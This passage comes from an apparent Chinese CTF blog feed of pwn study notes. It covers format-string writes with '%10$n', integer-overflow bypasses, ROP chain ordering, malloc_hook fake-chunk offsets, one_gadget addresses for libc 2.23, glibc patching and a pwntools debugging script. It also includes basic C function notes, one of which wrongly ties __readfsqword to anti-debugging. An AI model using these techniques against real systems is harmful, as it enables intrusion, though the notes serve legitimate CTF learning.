&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h5 id=&#34;str1str2时返回0一般用这个绕过也可以用x00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#str1str2时返回0一般用这个绕过也可以用x00截断&#34;&gt;#&lt;/a&gt; str1=str2 时返回 0，一般用这个绕过，也可以用 \x00 截断&lt;/h5&gt;
&lt;h3 id=&#34;10switch语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10switch语句&#34;&gt;#&lt;/a&gt; 10.switch () 语句&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;switch(表达式)&amp;#123; 
    case 常量表达式1:  语句1;
    case 常量表达式2:  语句2;
    … 
    case 常量表达式n:  语句n;
    default:  语句n+1;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&#34;将表达式的结果与常量表达式依次比较直到相同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#将表达式的结果与常量表达式依次比较直到相同&#34;&gt;#&lt;/a&gt; 将表达式的结果与常量表达式依次比较直到相同&lt;/h5&gt;
&lt;h3 id=&#34;11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等&#34;&gt;#&lt;/a&gt; 11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 复制到栈上，需要按照复制后的栈填充垃圾字符等等&lt;/h3&gt;
&lt;h3 id=&#34;12整数溢出漏洞比大小绕过判断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12整数溢出漏洞比大小绕过判断&#34;&gt;#&lt;/a&gt; 12. 整数溢出漏洞（比大小绕过判断），&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;无符号整型 unsigned int 遇到 -1 时会将 -1转化为该无符号整型的最大值

unsigned int ( -1 )=max unsigned int

int (-1)= -1

输入无符号整型时应该输入字符串（”-1“），不能是（b”-1“）
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13格式化字符串漏洞不仅仅用来泄露canary还可以改变地址内的值&#34;&gt;#&lt;/a&gt; 13. 格式化字符串漏洞（不仅仅用来泄露 canary，还可以改变地址内的值）&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pwnme地址（&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;位是&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;字节）&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;%10$n&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    有printf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;会将输入的payload存入buf偏移为&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;的地方&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;该偏移需要利用aaaa&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;p查看&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;，并且将&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;$前面的八字节大小视作&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;存入该地址&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;http://t.csdn.cn/1sJDx
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;14echo-flag-systemecho-flag&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14echo-flag-systemecho-flag&#34;&gt;#&lt;/a&gt; 14.echo flag 【system(&amp;quot;echo flag&amp;quot;)】&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;输出字符串，后面跟什么就输出什么，这里输出&amp;quot;flag&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;15valatoistr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#15valatoistr&#34;&gt;#&lt;/a&gt; 15.val=atoi(str)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;将str转为整数型字符串，当第一个字符不能识别为数字时，函数将停止读入输入字符串

str=&amp;quot;987654&amp;quot; ,val=(int)987654

str=&amp;quot;abc&amp;quot; ,      val=0
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;16-charmallocxsizeofchar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#16-charmallocxsizeofchar&#34;&gt;#&lt;/a&gt; 16. (char*)malloc(x*sizeof(char))&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;分配x字节连续的空间，从堆空间中分配，返回值为分配空间的首地址
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;1732位程序构造rop链时&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1732位程序构造rop链时&#34;&gt;#&lt;/a&gt; 17.32 位程序构造 rop 链时&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;因为32位程序是用栈来传参，调用函数返回地址在前参数在后，所以顺序应当为 ：

函数1+函数2+函数3+函数1的参数+函数2的参数+函数3的参数
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;18修改glibc版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#18修改glibc版本&#34;&gt;#&lt;/a&gt; 18. 修改 glibc 版本&lt;/h3&gt;
&lt;p&gt;当本地 glibc 版本不同会导致堆的地址不同等问题（glibc2.26 版本之后会出现一个新的 TcacheBin，导致释放的 chunk 不会先进入 fastbin 中）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Downloads/buuctf/babyheap_0ctf_2017
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;进入到 /pwn/glibc-all-in-one (自己的目录下)，cat list&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pPRkcxf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;用 ./download 下载我们需要的版本&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/13/pPRkoin.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;使用上面的命令换版本即可&lt;/p&gt;
&lt;p&gt;【下载不超过请换源，vim download, 注释掉清华源，放出官方源】&lt;/p&gt;
&lt;h3 id=&#34;19-关于malloc_hook&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#19-关于malloc_hook&#34;&gt;#&lt;/a&gt; 19. 关于 malloc_hook&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;malloc_hook&lt;/code&gt;  指向的地址不为空时则执行其指向的函数，可以以此来 gadget（配合  &lt;code&gt;one_gadget&lt;/code&gt;  使用）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;malloc_hook=main_arena-0x10

一般：
fake_chunk=mian_arena-0x33
所以 malloc_hook=fake_chunk+0x23
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#20-使用one_gadget工具来得到getshell的函数地址在对应的库目录下使用&#34;&gt;#&lt;/a&gt; 20. 使用 one_gadget 工具来得到 getshell 的函数地址（在对应的库目录下使用）&lt;/h3&gt;
&lt;p&gt;该工具是基于对应的库来查找的，所以使用时 真正地址为 libc_base + 地址， &lt;strong&gt;下面的需要让 rax 满足对应的要求&lt;/strong&gt;&lt;br /&gt;
 one_gadget 对应的库&lt;br /&gt;
（例如：one_gadget &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xpYmMtMi4yMy5zbw==&#34;&gt;libc-2.23.so&lt;/span&gt; , 得到如下结果）&lt;br /&gt;
&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/14/pPRzZNV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdW5yNHYzMS9wLzE1MTczODExLmh0bWw=&#34;&gt;https://www.cnblogs.com/unr4v31/p/15173811.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjcyMA==&#34;&gt;https://xz.aliyun.com/t/2720&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;one_gadget，这里记一下比较常用的（libc2.23-0ubuntu11.2 版本已经不在使用）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2
og2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是利用 read 与 gadget 地址的关系爆破修改（1/16 概率）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYxMTEyLmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-261112.htm&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;21查询程序对应glibc版本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21查询程序对应glibc版本&#34;&gt;#&lt;/a&gt; 21. 查询程序对应 glibc 版本&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmd1aS5jYy9lbC8zMzI3NzgzLmh0bWw/YWN0aW9uPW9uQ2xpY2s=&#34;&gt;https://www.ngui.cc/el/3327783.html?action=onClick&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY5MTU1Lmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-269155.htm&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ldd 程序名  //用ldd命令查看当前对应glibc版本
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1.ubuntu 16 环境（glibc 2.23~glibc 2.26）&lt;/p&gt;
&lt;p&gt;2.ubuntu18&lt;sub&gt;ubuntu20 环境（glibc2.26&lt;/sub&gt;glibc2.32）&lt;/p&gt;
&lt;p&gt;机制更新&lt;/p&gt;
&lt;p&gt;(1) 在 glibc2.26 之后堆管理器中加入了 tcachebin，tcachebin 是 glibc 2.26 版本引入的一种优化机制，用于管理小型内存块的缓存，以加速内存分配和释放的性能。在 tcachebin 中每种大小的堆块最多只能存放 7 个。&lt;/p&gt;
&lt;p&gt;加入了 tcachebin 后，释放的堆块就会优先进入 tcachebin 中，只有当释放的堆块是一个 large bin chunk (大小大于 0x410)，或者 tcachebin 对应大小的堆块已经满 7 个时才会置入 fastbin 或 unsortedbin 中&lt;/p&gt;
&lt;p&gt;(2) 在加入了 tcachebin 后堆管理器在初始化时会先 malloc 一块大小为 0x251 的堆块存放 tcachebins 中指针&lt;/p&gt;
&lt;p&gt;利用方式（要想堆块释放后进入 unsortedbin 中就要绕过 tcachebin，由于程序有堆块申请数量限制难以填满 tcachebin 所以选择 free 一个大小大于 0x410 的堆块）&lt;/p&gt;
&lt;h3 id=&#34;22fopenarg1arg2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22fopenarg1arg2&#34;&gt;#&lt;/a&gt; 22.fopen(&amp;quot;arg1&amp;quot;,&amp;quot;arg2&amp;quot;)&lt;/h3&gt;
&lt;p&gt;arg1 为打开文件名，arg2 为打开文件的访问模式（读写等方式）&lt;/p&gt;
&lt;p&gt;文件不存在则返回 NULL&lt;/p&gt;
&lt;h3 id=&#34;23gdb本地调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23gdb本地调试&#34;&gt;#&lt;/a&gt; 23.gdb 本地调试&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt;from pwn import *
p=process(&#39;./ez_pz_hackover_2016&#39;)
context.log_level=&#39;debug&#39;
 
gdb.attach(p)  ## 会在此处再打开一个终端
# &#39;b *0x8048600&#39;  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车
，
p.recvuntil(&#39;crash: &#39;)
stack=int(p.recv(10),16)#接收s在栈上的地址

payload=&#39;crashme\x00&#39;+&#39;aaaaaa&#39;#crashme\x00绕过if判断      

pause()  #必须要在发送的payload前面，不然直接发送结束无法查询了
p.sendline(payload)
 
pause()  #必要的，不能少
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此处的重点就是在发送 &lt;code&gt;payload&lt;/code&gt;  前加入 &lt;code&gt;gdb.attach(p)&lt;/code&gt;  和 &lt;code&gt;pause&lt;/code&gt; ，发送 &lt;code&gt;payload&lt;/code&gt;  后加入 &lt;code&gt;pause()&lt;/code&gt; ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： &lt;code&gt;gdb.attach(p,&amp;quot;b *0x8048600&amp;quot;)&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;然后新终端内输入 &lt;code&gt;c&lt;/code&gt;  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况&lt;/p&gt;
&lt;p&gt;不知道为什么要加入两个 &lt;code&gt;pause（）&lt;/code&gt; 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/</guid>
            <title>C语言函数及漏洞利用</title>
            <link>https://vvwwvv.cn/2023/08/24/pwn/c%E5%87%BD%E6%95%B0%E5%8F%8A%E6%BC%8F%E6%B4%9E/</link>
            <category>pwn</category>
            <category>C语言</category>
            <pubDate>Thu, 24 Aug 2023 19:23:15 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;这里用来记录在 pwn 题中一些 C 语言函数的作用和一些函数的漏洞&lt;/p&gt;
&lt;h1 id=&#34;1-atol-atoi-atoq&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-atol-atoi-atoq&#34;&gt;#&lt;/a&gt; 1. atol、 atoi、atoq&lt;/h1&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;atoi&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;nptr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;atol&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;nptr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;atoll&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;nptr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;atoq&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;nptr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;atoi:  把字符串nptr转换为int
atol:  把字符串nptr转换为 long int/long long int
atoq:  
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2__readfsqword0x28u&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2__readfsqword0x28u&#34;&gt;#&lt;/a&gt; 2.__readfsqword(0x28u)&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;这段代码是通常用于 alarm 函数，防止调试&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__readfsbyte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; Offset&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__readfsword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; Offset&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__readfsdword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; Offset&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;token function&#34;&gt;__readfsqword&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; Offset&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Offset:&lt;br /&gt;
[in] 从 FS 的开头开始读取的偏移量。&lt;/p&gt;
&lt;p&gt;返回值：位置 FS:[Offset] 处的字节、字、双字或四字（由调用的函数名称指示）的内存内容。&lt;/p&gt;
&lt;h1 id=&#34;3fopenarg1agr2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3fopenarg1agr2&#34;&gt;#&lt;/a&gt; 3.fopen(&amp;quot;arg1&amp;quot;,&amp;quot;agr2&amp;quot;)&lt;/h1&gt;
&lt;p&gt;该函数原型：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;FILE &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;mode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//filename-- 这是 C 字符串，包含了要打开的文件名称。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;//mode-- 这是 C 字符串，包含了文件访问模式。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;功能：使用给定的模式 mode 打开 filename 所指向的文件。&lt;/p&gt;
&lt;p&gt;返回值：文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回 NULL，并把错误代码存在 error 中。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/17/pPhGVIA.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
